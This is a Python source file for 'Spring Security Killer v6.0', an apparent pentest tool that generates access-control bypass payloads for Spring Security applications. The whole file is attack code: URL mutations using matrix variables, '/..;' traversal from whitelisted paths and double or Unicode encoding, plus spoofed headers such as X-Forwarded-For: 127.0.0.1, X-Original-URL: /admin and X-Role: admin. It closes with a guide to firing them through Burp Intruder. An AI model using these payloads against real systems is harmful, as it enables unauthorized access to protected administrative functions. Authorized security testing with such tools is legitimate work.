#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
--------------------------------------------------------------------------------------
 Tool Name   : Spring Security Killer v6.0 (Full Stack Edition)
 Author      : 七萬-QiWan
 Date        : 2025-11-23
 Description : The complete Spring Security assessment suite.
               Generates both URL-based bypass payloads and Header-based spoofing lists.
 New Module  :
   [+] Header Generator: IP Spoofing, URL Overriding (X-Original-URL), Protocol Confusion.
--------------------------------------------------------------------------------------
"""

import os
import sys
import datetime


# ===========================
# UI Configuration
# ===========================
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


class Logger:
    @staticmethod
    def info(msg): print(f"{Colors.BLUE}[INFO]{Colors.ENDC} {msg}")

    @staticmethod
    def success(msg): print(f"{Colors.GREEN}[SUCCESS]{Colors.ENDC} {msg}")

    @staticmethod
    def warn(msg): print(f"{Colors.WARNING}[WARN]{Colors.ENDC} {msg}")


# ===========================
# URL Engine (Preserved from v5.0)
# ===========================
class UrlFuzzEngine:
    def __init__(self):
        self.payloads = []
        self.seen = set()
        self.common_whitelists = ['/static', '/public', '/resources', '/assets', '/js', '/error']

    def add(self, payload, weight, tag="General"):
        if payload not in self.seen:
            self.seen.add(payload)
            self.payloads.append({'p': payload, 'w': weight, 't': tag})

    def generate(self, base_path):
        path = "/" + base_path.strip().lstrip("/")
        if "?" in path: path = path.split("?")[0]

        # 1. Matrix Variables
        self._layer_matrix(path)
        # 2. Normalization
        self._layer_normalization(path)
        # 3. Prefix Injection
        self._layer_prefix_injection(path)
        # 4. Suffix Confusion
        self._layer_suffix_confusion(path)
        # 5. Advanced Encoding
        self._layer_advanced_encoding(path)
        # 6. Protocol Confusion
        self._layer_protocol_confusion(path)

    def _layer_matrix(self, path):
        parts = path.strip('/').split('/')
        current = ""
        for i, part in enumerate(parts):
            current += "/" + part
            remaining = "/" + "/".join(parts[i + 1:]) if i < len(parts) - 1 else ""
            self.add(current + ";" + remaining, 10, "Matrix")
            self.add(current + ";/" + remaining, 10, "Matrix")
            self.add(current + ";jsessionid=x" + remaining, 10, "Matrix")
        self.add(path + ";", 10, "Matrix")

    def _layer_normalization(self, path):
        self.add(path.replace('/', '//'), 9, "Norm")
        self.add('//' + path.lstrip('/'), 9, "Norm")
        self.add(path.replace('/', '/./'), 9, "Norm")
        self.add(f"/;{path}", 9, "Norm")
        self.add(f"/foo/..;{path}", 9, "Norm")

    def _layer_prefix_injection(self, path):
        for w in self.common_whitelists:
            self.add(f"{w}/..;{path}", 8, "Prefix-Inj")
            self.add(f"{w}/..{path}", 7, "Prefix-Inj")

    def _layer_suffix_confusion(self, path):
        for ext in ['.json', '.html', '.css', '.js']:
            self.add(path + ext, 7, "Suffix")
            self.add(path + ";" + ext, 8, "Suffix")

    def _layer_advanced_encoding(self, path):
        self.add(path.replace('/', '%252f'), 6, "Encode")
        self.add(path.replace('/', '%ef%bc%8f'), 6, "Unicode")
        self.add(path.replace('.', '%2e'), 6, "Encode")

    def _layer_protocol_confusion(self, path):
        self.add(path + "?_method=POST", 5, "Method")
        self.add(path + "?", 5, "Gateway")
        self.add(path + "#", 5, "Gateway")

    def get_results(self):
        return sorted(self.payloads, key=lambda x: x['w'], reverse=True)


# ===========================
# Header Engine (New Module)
# ===========================
class HeaderFuzzEngine:
    def __init__(self):
        self.headers = []

    def generate(self, target_paths):
        """
        Generates headers based on common bypass techniques.
        target_paths: List of sensitive paths (e.g., /admin) to use in X-Original-URL
        """
        # 1. IP Spoofing (Bypass IP Whitelists)
        # -------------------------------------
        spoof_ips = ["127.0.0.1", "localhost", "0.0.0.0", "192.168.0.1", "10.0.0.1"]
        ip_headers = [
            "X-Forwarded-For", "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr",
            "Client-IP", "X-Real-IP", "X-Client-IP", "True-Client-IP", "Cluster-Client-IP"
        ]

        for header in ip_headers:
            for ip in spoof_ips:
                self.headers.append(f"{header}: {ip}")
                # Double IP spoofing (sometimes works for proxies)
                self.headers.append(f"{header}: {ip}, {ip}")

        # 2. URL Overriding (Bypass URL ACLs)
        # -----------------------------------
        # 这里的逻辑是：请求访问一个低权限 URL (如 /)，但在 Header 里告诉后端其实要访问 /admin
        # 注意：在 Burp 中，你需要将请求路径改为 / 或 /public，然后配合这些 Header
        url_headers = ["X-Original-URL", "X-Rewrite-URL", "X-Forwarded-Prefix"]

        for path in target_paths:
            clean_path = "/" + path.strip().lstrip("/")
            for header in url_headers:
                self.headers.append(f"{header}: {clean_path}")
                # 尝试不带前导斜杠
                self.headers.append(f"{header}: {clean_path.lstrip('/')}")

        # 3. Protocol & Port Confusion
        # ----------------------------
        self.headers.append("X-Forwarded-Proto: http")  # 绕过强制 HTTPS
        self.headers.append("X-Forwarded-Proto: https")
        self.headers.append("X-Forwarded-Port: 443")
        self.headers.append("X-Forwarded-Port: 80")
        self.headers.append("X-Forwarded-Scheme: http")

        # 4. Custom Auth Spoofing
        # -----------------------
        # 针对某些微服务架构内部传递用户信息
        self.headers.append("X-User-Id: 1")
        self.headers.append("X-User-Id: admin")
        self.headers.append("X-Role: admin")
        self.headers.append("X-Admin: true")

        return list(set(self.headers))  # Dedup


# ===========================
# Main Workflow
# ===========================
def auto_detect_file():
    cwd = os.getcwd()
    files = [f for f in os.listdir(cwd) if os.path.isfile(f) and f.endswith('.txt') and not f.startswith('fuzz_')]
    if not files:
        Logger.warn("No target .txt files found.")
        sys.exit(1)
    return files[0]


def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{Colors.BOLD}{Colors.HEADER}")
    print(r"""
   _________            _               ____  __   ________   
  /   _____/___________|__| ____   ____|    |/ _| /  _____/   
  \_____  \\____ \_  __ \  |/    \/ ___|      <  /   __  \    
  /        \  |_> >  | \/  |   |  \___ \    |  \ \  |__\  \   
 /_______  /   __/|__|  |__|___|  /____>____|__ \ \_____  /   
         \/|__|                 \/             \/       \/    
    Spring Security Killer v6.0 [Full Stack Edition]
    Author: 七萬-QiWan
    Modes : URL Bypass + Header Injection
    """)
    print(f"{Colors.ENDC}")

    target_file = auto_detect_file()
    Logger.info(f"Target File: {target_file}")

    try:
        with open(target_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
    except:
        sys.exit(1)

    # 1. Generate URL Payloads
    url_engine = UrlFuzzEngine()
    print(f"{Colors.CYAN}[*] Generating Context-Aware URL Payloads...{Colors.ENDC}")
    for t in targets:
        url_engine.generate(t)
    url_results = url_engine.get_results()

    # 2. Generate Header Payloads
    header_engine = HeaderFuzzEngine()
    print(f"{Colors.CYAN}[*] Generating Spoofed Headers...{Colors.ENDC}")
    header_results = header_engine.generate(targets)

    # 3. Save Outputs
    now = datetime.datetime.now()
    timestamp = now.strftime('%Y%m%d_%H%M')

    file_urls = f"fuzz_urls_{timestamp}.txt"
    file_headers = f"fuzz_headers_{timestamp}.txt"

    # Save URLs
    with open(file_urls, 'w') as f:
        for item in url_results:
            f.write(f"{item['p']}\n")

    # Save Headers
    with open(file_headers, 'w') as f:
        for h in header_results:
            f.write(f"{h}\n")

    print("-" * 50)
    Logger.success(f"Generated {len(url_results)} URL Payloads -> {file_urls}")
    Logger.success(f"Generated {len(header_results)} Header Payloads -> {file_headers}")

    print(f"\n{Colors.WARNING}[!] Tactical Guide (How to use Headers):{Colors.ENDC}")
    print("    1. Load 'fuzz_headers_xxxx.txt' into Burp Intruder.")
    print("    2. Injection Point: Insert beneath standard headers.")
    print("    3. Logic: Send request to / (home) but inject 'X-Original-URL: /admin'.")
    print("    4. Watch for: 200 OK or changes in Content-Length.")


if __name__ == "__main__":
    main()